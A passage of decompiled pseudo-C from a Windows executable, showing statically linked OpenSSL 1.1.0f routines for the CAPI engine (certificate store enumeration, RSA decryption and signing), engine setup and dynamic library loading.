  BYTE *pbCertEncoded; // [rsp+20h] [rbp-58h] BYREF

  v5 = 0;
  v6 = 0i64;
  v7 = a4;
  v8 = a3;
  v9 = sub_140034A50(a1, dword_140135180);
  *v7 = 0i64;
  v10 = "MY";
  *a5 = 0i64;
  if ( *(_QWORD *)(v9 + 48) )
    v10 = *(const char **)(v9 + 48);
  result = (__int64)sub_140033EC0(v9, v10);
  v12 = (void *)result;
  if ( result )
  {
    v13 = 0;
    v14 = CertEnumCertificatesInStore((HCERTSTORE)result, 0i64);
    if ( v14 )
    {
      do
      {
        pbCertEncoded = v14->pbCertEncoded;
        v15 = sub_14005EEF0(0i64, (char **)&pbCertEncoded, v14->cbCertEncoded);
        v16 = (unsigned int *)v15;
        if ( v15 )
        {
          if ( (unsigned int)sub_1400346B0(v8, v15) && (unsigned int)sub_140060BB0((__int64)v16, 1, 0) )
          {
            v17 = sub_140032640(v9, v14);
            if ( v17 )
            {
              v18 = CertDuplicateCertificateContext(v14);
              v19 = dword_14013518C;
              *v17 = (HCRYPTPROV)v18;
              sub_14005EED0((__int64)v16, v19, (__int64)v17);
              if ( !v6 )
                v6 = (int *)sub_1400296C0();
              sub_1400297C0(v6, (__int64)v16);
              v8 = a3;
            }
            else
            {
              sub_14005EE60(v16);
              v8 = a3;
            }
          }
          else
          {
            sub_14005EE60(v16);
          }
        }
        else
        {
          sub_140031000(v9, "Can't Parse Certificate %d\n", v13);
        }
        ++v13;
        v14 = CertEnumCertificatesInStore(v12, v14);
      }
      while ( v14 );
      v7 = a4;
    }
    CertCloseStore(v12, 0);
    if ( !v6 )
      return 0i64;
    v20 = (*(__int64 (__fastcall **)(__int64, __int64, int *))(v9 + 72))(a1, a2, v6);
    if ( (int)sub_1400296E0((unsigned int *)v6) > 0 )
    {
      do
      {
        v21 = sub_140029880((__int64)v6, v5);
        v22 = (unsigned int *)v21;
        if ( v5 == v20 )
        {
          *v7 = v21;
        }
        else
        {
          v23 = sub_14005EEA0(v21, dword_14013518C);
          v24 = v23;
          if ( v23 )
          {
            CryptDestroyKey(*(_QWORD *)(v23 + 16));
            CryptReleaseContext(*(_QWORD *)(v24 + 8), 0);
            if ( *(_QWORD *)v24 )
              CertFreeCertificateContext(*(PCCERT_CONTEXT *)v24);
            sub_14001D930((void *)v24);
          }
          sub_14005EE60(v22);
          v7 = a4;
        }
        ++v5;
      }
      while ( v5 < (int)sub_1400296E0((unsigned int *)v6) );
    }
    sub_1400294B0((void **)v6);
    if ( *v7 )
    {
      v25 = sub_14005EEA0(*v7, dword_14013518C);
      v26 = sub_1400328C0(a1, v25);
      v27 = dword_14013518C;
      *a5 = v26;
      sub_14005EED0(*v7, v27, 0i64);
      return 1i64;
    }
    else
    {
      return 0i64;
    }
  }
  return result;
}
// 140135180: using guessed type int dword_140135180;
// 14013518C: using guessed type int dword_14013518C;

//----- (0000000140033EC0) ----------------------------------------------------
HCERTSTORE __fastcall sub_140033EC0(__int64 a1, const char *a2)
{
  const char *pvPara; // rbx
  HCERTSTORE result; // rax
  int v5; // eax

  pvPara = a2;
  if ( !a2 )
  {
    pvPara = "MY";
    if ( *(_QWORD *)(a1 + 40) )
      pvPara = *(const char **)(a1 + 40);
  }
  sub_140031000(a1, "Opening certificate store %s\n", pvPara);
  result = CertOpenStore((LPCSTR)9, 0, 0i64, *(_DWORD *)(a1 + 56), pvPara);
  if ( !result )
  {
    v5 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v5 = sub_140024020();
      dword_140142C24 = v5;
    }
    sub_140024610(v5, 109, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1389);
    sub_140031280();
    return 0i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140033F70) ----------------------------------------------------
__int64 __fastcall sub_140033F70(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx

  v2 = sub_14002D030(a1, dword_140135184);
  v3 = v2;
  if ( v2 )
  {
    CryptDestroyKey(*(_QWORD *)(v2 + 16));
    CryptReleaseContext(*(_QWORD *)(v3 + 8), 0);
    if ( *(_QWORD *)v3 )
      CertFreeCertificateContext(*(PCCERT_CONTEXT *)v3);
    sub_14001D930((void *)v3);
  }
  sub_14002D2F0(a1, dword_140135184, 0i64);
  return 1i64;
}
// 140135184: using guessed type int dword_140135184;

//----- (0000000140034000) ----------------------------------------------------
__int64 __fastcall sub_140034000(int a1, __int64 a2, void *a3, __int64 a4, unsigned int a5)
{
  signed __int64 v5; // rsi
  __int64 jumpbuf_sp; // rax
  __int64 v11; // rax
  __int64 v12; // r14
  int v13; // eax
  int v14; // eax
  char *v15; // rax
  void *pbData; // rdi
  int v17; // eax
  signed __int64 v18; // rcx
  char *v19; // rdx
  char v20; // al
  int v21; // eax
  DWORD v22; // ebx
  DWORD pdwDataLen; // [rsp+30h] [rbp-48h] BYREF
  char v24[16]; // [rsp+38h] [rbp-40h] BYREF

  v5 = a1;
  if ( a1 <= 0 )
    return (unsigned int)a1;
  jumpbuf_sp = _except_get_jumpbuf_sp(a4);
  v11 = sub_140034A50(jumpbuf_sp, dword_140135180);
  sub_140031000(v11, "Called capi_rsa_priv_dec()\n");
  v12 = sub_14002D030(a4, dword_140135184);
  if ( v12 )
  {
    if ( a5 == 1 )
    {
      v15 = (char *)sub_14001D8E0(v5);
      pbData = v15;
      if ( v15 )
      {
        v18 = 0i64;
        if ( (int)v5 > 0 )
        {
          v19 = &v15[v5 - 1];
          do
          {
            v20 = *(_BYTE *)(v18 + a2);
            ++v18;
            *v19-- = v20;
          }
          while ( v18 < v5 );
        }
        pdwDataLen = v5;
        if ( CryptDecrypt(*(_QWORD *)(v12 + 16), 0i64, 1, 0, (BYTE *)pbData, &pdwDataLen) )
        {
          v22 = pdwDataLen;
          memmove(a3, pbData, (int)pdwDataLen);
          sub_14001D930(pbData);
          return v22;
        }
        else
        {
          v21 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v21 = sub_140024020();
            dword_140142C24 = v21;
          }
          sub_140024610(v21, 110, 105, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 954);
          sub_140031280();
          sub_14001D930(pbData);
          return 0xFFFFFFFFi64;
        }
      }
      else
      {
        v17 = dword_140142C24;
        if ( !dword_140142C24 )
        {
          v17 = sub_140024020();
          dword_140142C24 = v17;
        }
        sub_140024610(v17, 110, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 945);
        return 0xFFFFFFFFi64;
      }
    }
    else
    {
      sub_14002A5C0(v24, 0xAui64, "%d", a5);
      v14 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v14 = sub_140024020();
        dword_140142C24 = v14;
      }
      sub_140024610(v14, 110, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 938);
      sub_140023A40(2, "padding=", v24);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    v13 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v13 = sub_140024020();
      dword_140142C24 = v13;
    }
    sub_140024610(v13, 110, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 931);
    return 0xFFFFFFFFi64;
  }
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135180: using guessed type int dword_140135180;
// 140135184: using guessed type int dword_140135184;
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140034280) ----------------------------------------------------
__int64 sub_140034280()
{
  int v0; // eax

  v0 = dword_140142C24;
  if ( !dword_140142C24 )
  {
    v0 = sub_140024020();
    dword_140142C24 = v0;
  }
  sub_140024610(v0, 111, 112, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 814);
  return 0xFFFFFFFFi64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400342D0) ----------------------------------------------------
__int64 __fastcall sub_1400342D0(int a1, const BYTE *a2, __int64 a3, BYTE *a4, DWORD *a5, __int64 a6)
{
  unsigned int v9; // esi
  __int64 jumpbuf_sp; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rbp
  int v14; // eax
  ALG_ID v15; // edx
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  DWORD v20; // r9d
  __int64 v21; // r10
  BYTE v22; // r8
  __int64 v23; // r9
  DWORD pdwSigLen; // [rsp+30h] [rbp-68h] BYREF
  HCRYPTHASH hHash; // [rsp+38h] [rbp-60h] BYREF
  char v27[16]; // [rsp+40h] [rbp-58h] BYREF

  v9 = -1;
  jumpbuf_sp = _except_get_jumpbuf_sp(a6);
  v11 = sub_140034A50(jumpbuf_sp, dword_140135180);
  sub_140031000(v11, "Called CAPI_rsa_sign()\n");
  v12 = sub_14002D030(a6, dword_140135184);
  v13 = v12;
  if ( !v12 )
  {
    v14 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v14 = sub_140024020();
      dword_140142C24 = v14;
    }
    sub_140024610(v14, 112, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 835);
    return v9;
  }
  if ( a1 > 672 )
  {
    if ( a1 == 673 )
    {
      v15 = 32781;
    }
    else
    {
      if ( a1 != 674 )
        goto LABEL_16;
      v15 = 32782;
    }
LABEL_21:
    if ( CryptCreateHash(*(_QWORD *)(v12 + 8), v15, 0i64, 0, &hHash) )
    {
      if ( CryptSetHashParam(hHash, 2u, a2, 0) )
      {
        pdwSigLen = sub_14005E580(a6);
        if ( CryptSignHashW(hHash, *(_DWORD *)(v13 + 24), 0i64, 0, a4, &pdwSigLen) )
        {
          v20 = pdwSigLen;
          v21 = 0i64;
          v9 = 1;
          if ( (pdwSigLen & 0xFFFFFFFE) != 0 )
          {
            do
            {
              v22 = a4[v21];
              v23 = v20 - (unsigned int)v21 - 1;
              a4[v21] = a4[v23];
              v21 = (unsigned int)(v21 + 1);
              a4[v23] = v22;
              v20 = pdwSigLen;
            }
            while ( (unsigned int)v21 < pdwSigLen >> 1 );
          }
          *a5 = v20;
        }
        else
        {
          v19 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v19 = sub_140024020();
            dword_140142C24 = v19;
          }
          sub_140024610(v19, 112, 111, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 890);
          sub_140031280();
        }
      }
      else
      {
        v18 = dword_140142C24;
        if ( !dword_140142C24 )
        {
          v18 = sub_140024020();
          dword_140142C24 = v18;
        }
        sub_140024610(v18, 112, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 882);
        sub_140031280();
      }
      CryptDestroyHash(hHash);
    }
    else
    {
      v17 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v17 = sub_140024020();
        dword_140142C24 = v17;
      }
      sub_140024610(v17, 112, 99, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 875);
      sub_140031280();
    }
    return v9;
  }
  switch ( a1 )
  {
    case 672:
      v15 = 32780;
      goto LABEL_21;
    case 4:
      v15 = 32771;
      goto LABEL_21;
    case 64:
      v15 = 32772;
      goto LABEL_21;
    case 114:
      v15 = 32776;
      goto LABEL_21;
  }
LABEL_16:
  sub_14002A5C0(v27, 0xAui64, "%x", (unsigned int)a1);
  v16 = dword_140142C24;
  if ( !dword_140142C24 )
  {
    v16 = sub_140024020();
    dword_140142C24 = v16;
  }
  sub_140024610(v16, 112, 119, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 867);
  sub_140023A40(2, "NID=0x", v27);
  return v9;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135180: using guessed type int dword_140135180;
// 140135184: using guessed type int dword_140135184;
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400345F0) ----------------------------------------------------
void __fastcall sub_1400345F0(__int64 a1, int a2, char *a3, int *a4)
{
  const CHAR *v6; // rcx
  __int64 *v7; // rax
  __int64 v8; // rbx
  int v9; // eax

  if ( a1 )
  {
    if ( *(_DWORD *)a1 >= a2 )
    {
      v6 = *(const CHAR **)(a1 + 8);
      if ( v6 )
      {
        v7 = sub_14003E440(v6, "a+");
        v8 = (__int64)v7;
        if ( v7 )
        {
          sub_14002A640((__int64)v7, a3, a4);
          sub_140029BA0(v8);
        }
        else
        {
          v9 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v9 = sub_140024020();
            dword_140142C24 = v9;
          }
          sub_140024610(v9, 118, 128, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1065);
        }
      }
    }
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400346B0) ----------------------------------------------------
__int64 __fastcall sub_1400346B0(unsigned int *a1, __int64 a2)
{
  int v5; // ebx
  __int64 v6; // rdi
  __int64 v7; // rax

  if ( (int)sub_1400296E0(a1) <= 0 )
    return 1i64;
  v5 = 0;
  if ( (int)sub_1400296E0(a1) <= 0 )
    return 0i64;
  while ( 1 )
  {
    v6 = sub_140029880((__int64)a1, v5);
    v7 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a2);
    if ( !sub_14005EF30(v6, v7) )
      break;
    if ( ++v5 >= (int)sub_1400296E0(a1) )
      return 0i64;
  }
  return 1i64;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (0000000140034750) ----------------------------------------------------
void sub_140034750()
{
  _QWORD *v0; // rax
  _QWORD *v1; // rbx

  v0 = sub_140034A80();
  v1 = v0;
  if ( v0 )
  {
    if ( (unsigned int)sub_140031040(v0) )
    {
      sub_140040DC0(v1);
      sub_1400349C0((__int64)v1);
      sub_140023B90();
    }
    else
    {
      sub_1400349C0((__int64)v1);
    }
  }
}

//----- (00000001400347B0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400347B0(__int64 a1, char *a2, int a3)
{
  __int64 v3; // rbx
  int v5; // eax
  __int64 v7; // r10
  char *v8; // r9
  char *v9; // rax
  char v10; // cl
  char v11; // dl

  v3 = a3;
  v5 = a3;
  v5 /= 2;
  v7 = v5;
  if ( v5 > 0 )
  {
    v8 = a2;
    v9 = &a2[v3 - 1];
    do
    {
      v10 = *v9--;
      v11 = *v8;
      *v8++ = v10;
      v9[1] = v11;
      --v7;
    }
    while ( v7 );
  }
  return sub_140026840(a2, v3, a1) != 0;
}

//----- (0000000140034820) ----------------------------------------------------
CHAR *__fastcall sub_140034820(const WCHAR *a1)
{
  __int64 v3; // rbx
  int v5; // eax
  int cbMultiByte; // ebp
  int v7; // eax
  CHAR *lpMultiByteStr; // rax
  CHAR *v9; // rsi
  int v10; // eax
  int v11; // eax

  if ( !a1 )
    return 0i64;
  v3 = -1i64;
  while ( a1[++v3] != 0 )
    ;
  v5 = WideCharToMultiByte(0, 0, a1, v3 + 1, 0i64, 0, 0i64, 0i64);
  cbMultiByte = v5;
  if ( v5 )
  {
    lpMultiByteStr = (CHAR *)sub_14001D8E0(v5);
    v9 = lpMultiByteStr;
    if ( lpMultiByteStr )
    {
      if ( WideCharToMultiByte(0, 0, a1, v3 + 1, lpMultiByteStr, cbMultiByte, 0i64, 0i64) )
      {
        return v9;
      }
      else
      {
        sub_14001D930(v9);
        v11 = dword_140142C24;
        if ( !dword_140142C24 )
        {
          v11 = sub_140024020();
          dword_140142C24 = v11;
        }
        sub_140024610(v11, 113, 127, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1112);
        return 0i64;
      }
    }
    else
    {
      v10 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v10 = sub_140024020();
        dword_140142C24 = v10;
      }
      sub_140024610(v10, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1107);
      return 0i64;
    }
  }
  else
  {
    v7 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v7 = sub_140024020();
      dword_140142C24 = v7;
    }
    sub_140024610(v7, 113, 127, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1102);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400349C0) ----------------------------------------------------
__int64 __fastcall sub_1400349C0(__int64 a1)
{
  void (__fastcall *v2)(__int64); // rax
  int v4; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 156), -1, &v4);
    if ( v4 <= 0 )
    {
      sub_14003C270(a1);
      sub_14004DB00(a1);
      v2 = *(void (__fastcall **)(__int64))(a1 + 88);
      if ( v2 )
        v2(a1);
      sub_140025FB0(0xAu, a1, (__int64 *)(a1 + 168));
      sub_14001D930((void *)a1);
    }
  }
  return 1i64;
}
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140034A50) ----------------------------------------------------
__int64 __fastcall sub_140034A50(__int64 a1, int a2)
{
  return sub_140026190((__int64 *)(a1 + 168), a2);
}

//----- (0000000140034A70) ----------------------------------------------------
void *sub_140034A70()
{
  return &unk_140142C30;
}

//----- (0000000140034A80) ----------------------------------------------------
void *sub_140034A80()
{
  int v0; // eax
  int v1; // ecx
  void *v2; // rax
  void *v3; // rbx

  v0 = sub_140025C90(&dword_140142C34, (void (*)(void))sub_140034C60);
  v1 = 0;
  if ( v0 )
    v1 = dword_140142C38;
  if ( v1 && (v2 = sub_14001DC20(0xC0ui64), (v3 = v2) != 0i64) )
  {
    *((_DWORD *)v2 + 39) = 1;
    if ( (unsigned int)sub_140026350(0xAu, (__int64)v2, (__int64 *)v2 + 21) )
    {
      return v3;
    }
    else
    {
      sub_14001D930(v3);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(38, 122, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_lib.c", 32);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C34: using guessed type _DWORD dword_140142C34;
// 140142C38: using guessed type int dword_140142C38;

//----- (0000000140034B40) ----------------------------------------------------
__int64 __fastcall sub_140034B40(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 144) = a2;
  return 1i64;
}

//----- (0000000140034B50) ----------------------------------------------------
__int64 __fastcall sub_140034B50(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 112) = a2;
  return 1i64;
}

//----- (0000000140034B60) ----------------------------------------------------
__int64 __fastcall sub_140034B60(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 88) = a2;
  return 1i64;
}

//----- (0000000140034B70) ----------------------------------------------------
__int64 __fastcall sub_140034B70(__int64 a1, int a2, __int64 a3)
{
  return sub_140026520((unsigned int **)(a1 + 168), a2, a3);
}

//----- (0000000140034B90) ----------------------------------------------------
__int64 __fastcall sub_140034B90(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 104) = a2;
  return 1i64;
}

//----- (0000000140034BA0) ----------------------------------------------------
__int64 __fastcall sub_140034BA0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 152) = a2;
  return 1i64;
}

//----- (0000000140034BB0) ----------------------------------------------------
__int64 __fastcall sub_140034BB0(_QWORD *a1, __int64 a2)
{
  int v2; // eax

  if ( a2 )
  {
    *a1 = a2;
    return 1i64;
  }
  else
  {
    sub_140024610(v2 - 18, v2 + 73, v2 + 11, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_lib.c", 187);
    return 0i64;
  }
}
// 140034BD8: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140034C00) ----------------------------------------------------
__int64 __fastcall sub_140034C00(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 96) = a2;
  return 1i64;
}

//----- (0000000140034C10) ----------------------------------------------------
__int64 __fastcall sub_140034C10(__int64 a1, __int64 a2)
{
  int v2; // eax

  if ( a2 )
  {
    *(_QWORD *)(a1 + 8) = a2;
    return 1i64;
  }
  else
  {
    sub_140024610(v2 - 18, v2 + 74, v2 + 11, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_lib.c", 197);
    return 0i64;
  }
}
// 140034C38: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140034C60) ----------------------------------------------------
_DWORD *sub_140034C60()
{
  _DWORD *result; // rax

  sub_14001E0C0(0i64, 0i64);
  result = sub_140025C10();
  qword_140147E80 = (__int64)result;
  dword_140142C38 = result != 0i64;
  return result;
}
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);
// 140142C38: using guessed type int dword_140142C38;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140034CA0) ----------------------------------------------------
_QWORD *__fastcall sub_140034CA0(__int64 a1)
{
  _QWORD *result; // rax
  int *v3; // rcx

  if ( qword_140142C28 || (result = sub_1400296C0(), (qword_140142C28 = (__int64)result) != 0) )
  {
    result = sub_14001D8E0(8ui64);
    if ( result )
    {
      v3 = (int *)qword_140142C28;
      *result = a1;
      return (_QWORD *)sub_140029500(v3, (__int64)result, 0);
    }
  }
  return result;
}
// 140142C28: using guessed type __int64 qword_140142C28;

//----- (0000000140034D10) ----------------------------------------------------
_QWORD *__fastcall sub_140034D10(__int64 a1)
{
  _QWORD *result; // rax
  int *v3; // rcx

  if ( qword_140142C28 || (result = sub_1400296C0(), (qword_140142C28 = (__int64)result) != 0) )
  {
    result = sub_14001D8E0(8ui64);
    if ( result )
    {
      v3 = (int *)qword_140142C28;
      *result = a1;
      return (_QWORD *)sub_1400297C0(v3, (__int64)result);
    }
  }
  return result;
}
// 140142C28: using guessed type __int64 qword_140142C28;

//----- (0000000140034D80) ----------------------------------------------------
void __fastcall sub_140034D80(void (**a1)(void))
{
  (*a1)();
  sub_14001D930(a1);
}

//----- (0000000140034DB0) ----------------------------------------------------
void sub_140034DB0()
{
  if ( qword_140142C28 )
  {
    sub_140029720((void *)qword_140142C28, (void (*)(void))sub_140034D80);
    qword_140142C28 = 0i64;
  }
  sub_140025BE0((_DWORD *)qword_140147E80);
}
// 140142C28: using guessed type __int64 qword_140142C28;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140034DF0) ----------------------------------------------------
__int64 __fastcall sub_140034DF0(__int64 a1, int a2)
{
  int v3; // eax
  void (__fastcall *v4)(__int64); // rax
  int v6; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    if ( a2 )
    {
      sub_140025D60((_DWORD *)(a1 + 156), -1, &v6);
      v3 = v6;
    }
    else
    {
      v3 = --*(_DWORD *)(a1 + 156);
      v6 = v3;
    }
    if ( v3 <= 0 )
    {
      sub_14003C270(a1);
      sub_14004DB00(a1);
      v4 = *(void (__fastcall **)(__int64))(a1 + 88);
      if ( v4 )
        v4(a1);
      sub_140025FB0(0xAu, a1, (__int64 *)(a1 + 168));
      sub_14001D930((void *)a1);
    }
  }
  return 1i64;
}
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140034EA0) ----------------------------------------------------
__int64 __fastcall sub_140034EA0(__int64 a1)
{
  __int64 result; // rax

  result = 0i64;
  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_QWORD *)(a1 + 112) = 0i64;
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_QWORD *)(a1 + 128) = 0i64;
  *(_QWORD *)(a1 + 144) = 0i64;
  *(_DWORD *)(a1 + 152) = 0;
  return result;
}

//----- (0000000140034EF0) ----------------------------------------------------
_BOOL8 sub_140034EF0()
{
  return (unsigned int)sub_1400241F0()
      && (unsigned int)sub_1400614B0()
      && (unsigned int)sub_140061640()
      && (unsigned int)sub_140061690()
      && (unsigned int)sub_140061780()
      && (unsigned int)sub_1400615A0()
      && (unsigned int)sub_140061730()
      && (unsigned int)sub_1400617D0()
      && (unsigned int)sub_1400616E0()
      && (unsigned int)sub_140061870()
      && (unsigned int)sub_140061500()
      && (unsigned int)sub_1400618C0()
      && (unsigned int)sub_140061410()
      && (unsigned int)sub_1400615F0()
      && (unsigned int)sub_140061550()
      && (unsigned int)sub_140061460()
      && (unsigned int)sub_140061820()
      && (unsigned int)sub_140061910()
      && (unsigned int)sub_140061960()
      && (unsigned int)sub_1400619B0()
      && (unsigned int)sub_140061A00()
      && (unsigned int)sub_140061B40()
      && (unsigned int)sub_140061AA0()
      && (unsigned int)sub_140061AF0()
      && (unsigned int)sub_140061A50()
      && (unsigned int)sub_140061B90()
      && (unsigned int)sub_140061BE0()
      && (unsigned int)sub_140061C30()
      && (unsigned int)sub_140061C80();
}

//----- (0000000140035050) ----------------------------------------------------
__int64 __fastcall sub_140035050(__int64 a1, __int64 a2)
{
  __int64 (*v2)(void); // r8
  __int64 result; // rax
  int v4; // r8d
  int v5; // [rsp+20h] [rbp-18h]

  if ( !a1 || !a2 )
  {
    v5 = 177;
    v4 = 67;
LABEL_8:
    sub_140024610(37, 108, v4, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", v5);
    return 0i64;
  }
  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 24i64);
  if ( v2 )
  {
    result = v2();
    if ( result )
      return result;
    v5 = 185;
    v4 = 106;
    goto LABEL_8;
  }
  sub_140024610(37, 108, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 181);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400350D0) ----------------------------------------------------
void *__fastcall sub_1400350D0(__int64 a1, _BYTE *a2)
{
  int v2; // eax
  _BYTE *v3; // rbx
  __int64 (__fastcall *v4)(__int64, _BYTE *); // rax
  void *result; // rax
  __int64 (__fastcall *v6)(__int64, _BYTE *); // r8

  v3 = a2;
  if ( !a1 )
  {
    sub_140024610(37, 126, v2 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 284);
    return 0i64;
  }
  if ( !a2 )
  {
    v3 = *(_BYTE **)(a1 + 48);
    if ( !v3 )
    {
      sub_140024610(37, 126, 111, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 290);
      return 0i64;
    }
  }
  if ( (*(_BYTE *)(a1 + 20) & 1) == 0 )
  {
    v4 = *(__int64 (__fastcall **)(__int64, _BYTE *))(a1 + 32);
    if ( v4 )
    {
      result = (void *)v4(a1, v3);
      goto LABEL_11;
    }
    v6 = *(__int64 (__fastcall **)(__int64, _BYTE *))(*(_QWORD *)a1 + 40i64);
    if ( v6 )
    {
      result = (void *)v6(a1, v3);
LABEL_11:
      if ( result )
        return result;
    }
  }
  result = sub_14003BB60(v3);
  if ( result )
    return result;
  sub_140024610(37, 126, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 302);
  return 0i64;
}
// 1400350EF: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140035180) ----------------------------------------------------
__int64 __fastcall sub_140035180(_DWORD *a1, unsigned int a2, int a3)
{
  int v3; // eax
  unsigned int v6; // edx
  unsigned int v7; // edx
  __int64 (__fastcall *v8)(_DWORD *, _QWORD); // r11

  if ( a1 )
  {
    v6 = a2 - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( v7 )
      {
        if ( v7 == 1 )
        {
          a1[5] |= a3;
          return 0i64;
        }
        else if ( *(_QWORD *)a1 && (v8 = *(__int64 (__fastcall **)(_DWORD *, _QWORD))(*(_QWORD *)a1 + 32i64)) != 0i64 )
        {
          return v8(a1, a2);
        }
        else
        {
          sub_140024610(37, 110, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 224);
          return 0xFFFFFFFFi64;
        }
      }
      else
      {
        a1[5] = a3;
        return 0i64;
      }
    }
    else
    {
      return (unsigned int)a1[5];
    }
  }
  else
  {
    sub_140024610(v3 - 19, v3 + 54, v3 + 11, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 204);
    return 0xFFFFFFFFi64;
  }
}
// 1400351A7: variable 'v3' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

